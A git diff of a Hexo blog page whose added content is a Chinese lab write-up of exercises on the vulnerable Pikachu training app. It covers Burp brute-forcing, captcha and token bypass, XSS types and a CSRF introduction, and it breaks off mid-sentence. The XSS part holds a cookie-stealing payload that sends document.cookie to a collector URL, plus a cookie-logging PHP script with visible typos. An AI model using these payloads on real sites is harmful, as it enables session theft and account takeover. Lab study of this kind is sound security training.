@@ -1,502 +1,699 @@
-
-
 <!DOCTYPE html>
-<html lang="en" data-default-color-scheme=auto>
-
-
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/SinkyQ/SinkyQ.github.io.git/img/fluid.png">
-  <link rel="icon" href="/SinkyQ/SinkyQ.github.io.git/img/fluid.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta charset="utf-8">
   
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Sinky">
-  <meta name="keywords" content="">
+  <title>Sinky&#39;s Blog</title>
+
+  <!-- keywords -->
   
-    <meta property="og:type" content="website">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
 <meta property="og:title" content="Sinky&#39;s Blog">
 <meta property="og:url" content="https://github.com/SinkyQ/SinkyQ.github.io.git/page/4/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="Sinky">
-<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Sinky&#39;s Blog" type="application/atom+xml">
   
   
+    <link rel="icon" href="/img/favicon.ico">
   
-  <title>Sinky&#39;s Blog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/highlight-dark.css" />
+<link rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/style.css">
+
+  
   
 
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"github.com","root":"/SinkyQ/SinkyQ.github.io.git/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/SinkyQ/SinkyQ.github.io.git/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/SinkyQ/SinkyQ.github.io.git/js/utils.js" ></script>
-  <script  src="/SinkyQ/SinkyQ.github.io.git/js/color-schema.js" ></script>
   
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
 
 
   
 <meta name="generator" content="Hexo 6.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/SinkyQ/SinkyQ.github.io.git/atom.xml" title="Sinky's Blog" type="application/atom+xml">
 </head>
-
-
 <body>
-  
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
 
-  <header>
-    
+		<hgroup>
+			<h1 class="header-author"><a href="/">Sinky</a></h1>
+		</hgroup>
 
-<div class="header-inner" style="height: 100vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/SinkyQ/SinkyQ.github.io.git/">
-      <strong>Sinky</strong>
-    </a>
+		
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/SinkyQ/SinkyQ.github.io.git/">Home</a></li>
+				        
+							<li><a href="/SinkyQ/SinkyQ.github.io.git/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/SinkyQ/SinkyQ.github.io.git/tags/Buu/" style="font-size: 10px;">Buu</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/RE/" style="font-size: 10px;">RE</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/Re/" style="font-size: 10px;">Re</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/bp/" style="font-size: 10px;">bp</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome-bug/" style="font-size: 13.33px;">chrome_bug</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 10px;">chrome调试</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/pikachu/" style="font-size: 13.33px;">pikachu</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/web/" style="font-size: 10px;">web</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 13.33px;">学习笔记</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 10px;">漏洞战争</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/">
-                <i class="iconfont icon-home-fill"></i>
-                Home
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                Archives
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                Categories
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                Tags
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/about/">
-                <i class="iconfont icon-user-fill"></i>
-                About
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
     </div>
-  </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/SinkyQ/SinkyQ.github.io.git/">Home</a></li>
+		        
+					<li><a href="/SinkyQ/SinkyQ.github.io.git/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
 </nav>
-
+      <div class="body-wrap">
   
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/SinkyQ/SinkyQ.github.io.git/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="心之所向，素履以往，生如逆旅，一苇以航"></span>
-          
-        </div>
-
-        
-      </div>
-
-      
-        <div class="scroll-down-bar">
-          <i class="iconfont icon-arrowdown"></i>
-        </div>
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      <div class="container nopadding-x-md">
-        <div id="board"
-          style="margin-top: 0">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/" target="_self">
-          pikachu漏洞练习记录1
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/" target="_self">
-        <div>
-          0x01 暴力破解基于表单的暴力破解开启bp抓包，对username,password字段的字典做爆破，得到admin&#x2F;123456. 验证码绕过(on server)随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。 将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。 验证码绕过(on client)同上步
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/web/">#web</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/" target="_self">
-          JIT学习
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/JIT%E5%AD%A6%E4%B9%A0/" target="_self">
-        <div>
-          JIT原理Just In Time编译，也叫运行时编译，不同于C&#x2F;C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。 还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/">#chrome知识点</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" target="_self">
-          Dlink DIR-823G 漏洞挖掘过程
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" target="_self">
-        <div>
-          固件下载地址： https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1YDuLaqdiDYXfkxJsjRqPNA 提取码：1ly1 0x01 漏洞介绍D-Link DIR-823G命令注入漏洞： CVE编号：CVE-2019-15529 D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-09 11:17" pubdate>
-              2022-08-09
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/SinkyQ/SinkyQ.github.io.git/tags/IOT/">#IOT</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" target="_self">
-          Win10下使用Hexo搭建个人博客
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" target="_self">
-        <div>
-          下载安装git、nodejs下载地址:  git: https:&#x2F;&#x2F;git-scm.com&#x2F;  nodejs: http:&#x2F;&#x2F;nodejs.cn&#x2F;download&#x2F; 将nodejs加入path环境变量中。打开cmd测试：   报错1：输入 npm-v 出现报错:  npm WARN config global --global, --local are deprecated. Use &#96;–loca
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2022-08-07 16:48" pubdate>
-              2022-08-07
-            </time>
-          </div>
-        
-        
-        
-      </div>
-    </article>
-  </div>
-
-
-
-  <nav aria-label="navigation">
-    <span class="pagination" id="pagination">
-      <a class="extend prev" rel="prev" href="/SinkyQ/SinkyQ.github.io.git/page/3/#board"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/">1</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/2/#board">2</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/3/#board">3</a><span class="page-number current">4</span>
-    </span>
-  </nav>
-
-
-
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
+    <article id="post-pikachu漏洞练习1" class="article article-type-post" itemscope itemprop="blogPost">
   
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    <div class="article-meta">
+      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/" class="article-date">
+  	<time datetime="2022-08-09T03:17:04.119Z" itemprop="datePublished">2022-08-09</time>
+</a>
     </div>
   
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/">
+        pikachu漏洞练习记录1
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-暴力破解"><a href="#0x01-暴力破解" class="headerlink" title="0x01 暴力破解"></a>0x01 暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>开启bp抓包，对username,password字段的字典做爆破，得到admin/123456.</p>
+<h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p>随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。</p>
+<p>将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。</p>
+<h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p>同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。</p>
+<p>查看源码，输入的验证码在本地验证：</p>
+<p><img src="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png" alt="捕获.PNG"></p>
+<p>可以在bp上不输入验证码或输入错误验证码都可以爆破。</p>
+<h2 id="token防爆破？"><a href="#token防爆破？" class="headerlink" title="token防爆破？"></a>token防爆破？</h2><blockquote>
+<p>token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。</p>
+</blockquote>
+<h3 id="基于token的身份验证"><a href="#基于token的身份验证" class="headerlink" title="基于token的身份验证"></a>基于token的身份验证</h3><ul>
+<li>客户端使用用户名和密码请求登录</li>
+<li>服务端收到请求去验证用户名和密码</li>
+<li>验证成功后，服务端会签发一个token，再将token发送给客户端</li>
+<li>客户端收到token后可以将它存储起来，比如放在cookie中或Local Storage里。</li>
+<li>客户端每次向服务端请求资源的时候需要带着服务端签发的token</li>
+<li>服务端收到请求，验证客户端请求里带着的token，如果验证成功，就像客户端返回请求的数据。</li>
+<li>app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app</li>
+</ul>
+<p>提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。</p>
+<p><img src="https://i.loli.net/2020/11/02/dlBS7qgfN9cYiIP.png" alt="捕获.PNG"></p>
+<p>在测试器中，设置password和token两个变量，使用pitchfork。</p>
+<p>点击<b>选项</b>，更改请求引擎中线程数为1，重定向选择<b>总是</b></p>
+<p><b>Grep-Extract</b>选择<b>添加</b>，中间<b>获得回应包</b><br>，选择token的值复制并选定，点击OK.</p>
+<p><img src="https://i.loli.net/2020/11/02/uLlDMSy46Qp8x2e.png" alt="捕获.PNG"></p>
+<p>回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。</p>
+<p><img src="https://i.loli.net/2020/11/02/gHncFXtKMUB9udA.png" alt="捕获.PNG"></p>
+<p>开始攻击，根据不同length找出正确密码，爆破完成。</p>
+<p>注：该方法着实鸡肋。</p>
+<h1 id="0x02-XSS-跨站脚本"><a href="#0x02-XSS-跨站脚本" class="headerlink" title="0x02 XSS(跨站脚本)"></a>0x02 XSS(跨站脚本)</h1><p>XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p>
+<p>因此在XSS漏洞的防范上一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。</p>
+<ul>
+<li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入。</li>
+<li>输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。</li>
+</ul>
+<h2 id="反射性xss-get"><a href="#反射性xss-get" class="headerlink" title="反射性xss(get)"></a>反射性xss(get)</h2><p>随意输入字符串，回显<b>who is xxx,i don’t care</b><br>f12查看，允许输入最大长度为20.</p>
+<p><img src="https://i.loli.net/2020/11/03/vpRrZbsNSgJcqAj.png" alt="捕获.PNG"></p>
+<p>更改一下可输入长度，输入一个简单的xss语句：<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code></p>
+<p>发现可以解析，即存在xss漏洞。</p>
+<p><img src="https://i.loli.net/2020/11/03/hrEMJyIq98Cs2Vm.png" alt="捕获.PNG"></p>
+<p>观察源码可知，它将提交的信息重新发送回来，后台没有对我们提交的信息做任何的漏洞。GET型的xss，一般将带有xss的url伪装后发送给目标即可。</p>
+<p>如果是post型xss，无法直接使用url的方式进行攻击。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>需要一个接受cookie的服务器（127.0.0.1：80），来接收受害主机的cookie。</p>
+<pre><code class="#getcookie.php(把接收的cookie存到cookie.txt文件)">&lt;?php
+$cookie=$_GET['cookie'];
+ #fp=$fopen("cookie.txt","a");
+fwirte($fp,"Cookie:".$cookie."/n")
+?&gt;
+</code></pre>
+<ul>
+<li>构造一个xss攻击的js代码</li>
+</ul>
+<p><code>&lt;script&gt;window.open("http://127.0.0.1/getcookie.php?cookie="+document.cookie);&lt;/script&gt;</code></p>
+<p>新弹出窗口成功获取到cookie。但是cookie.txt中并没有存储到cookie值……</p>
+<p><img src="https://i.loli.net/2020/11/04/thZo6fBkLyegRJj.png" alt="捕获.PNG"></p>
+<h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>post型漏洞一般是使用表单方式进行提交，无法直接使用url进行攻击。</p>
+<p>可以通过html页面方式提交，构造一个自己的post丢到自己的网站上</p>
+<p>随意输入字符提交，发现它并未在url中进行提交，说明我们不能将恶意代码嵌入到url中发送。</p>
+<p><img src="https://i.loli.net/2020/11/04/AOsxdLSJibDw8I6.png" alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/Tk6q81ICzpZtLdu.png" alt="捕获.PNG"></p>
+<blockquote>
+<p>http中get和post的基本区别：<br>get方式在客户端通过url提交数据，数据在url中可以看到；<br>Post方式，数据放置在html header内提交，数据在url中看不到。<br>get只能传输比较少的数据，安全性较低，post传输数据较多。</p>
+</blockquote>
+<p>我们可以构造一个带有表单提交的页面，让用户在登录完成后去点击，就可以盗取用户的cookie里。</p>
+<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>存储型xss下攻击者可以将脚本注入到后台存储起来构成更加持久的危害。<br>存储型xss又称永久型xss。</p>
+<p>1.打开实验，页面是一个留言板，尝试输入1111，发现输入被存储。输入单引号双引号尖括号，发现可以正常输出，说明后台没进行过滤。</p>
+<p><img src="https://i.loli.net/2020/11/04/UcbkOZPM56XoAGw.png" alt="捕获.PNG"></p>
+<p>2.注入<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code> 提交后会出现弹窗，每次刷新页面时都会弹出，与反射型xss的区别是：存储型xss已经被存储进后台代码中，所以每次刷新都会弹出XSS弹窗。所以存储型xss危害更大，会长久危害用户。</p>
+<p><img src="https://i.loli.net/2020/11/04/uFGYlo5dkwHahMT.png" alt="捕获.PNG"></p>
+<p><img src="https://i.loli.net/2020/11/04/IDX4duGil1fQwS5.png" alt="1111.PNG"></p>
+<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>DOM:一个一个访问html的标准编程接口，DOM是一个前端接口，没有和后端做任何的交互。</p>
+<h1 id="0x03-CSRF"><a href="#0x03-CSRF" class="headerlink" title="0x03 CSRF"></a>0x03 CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p>
+<h3 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h3><p>1.网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p>
+<p>2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成</p>
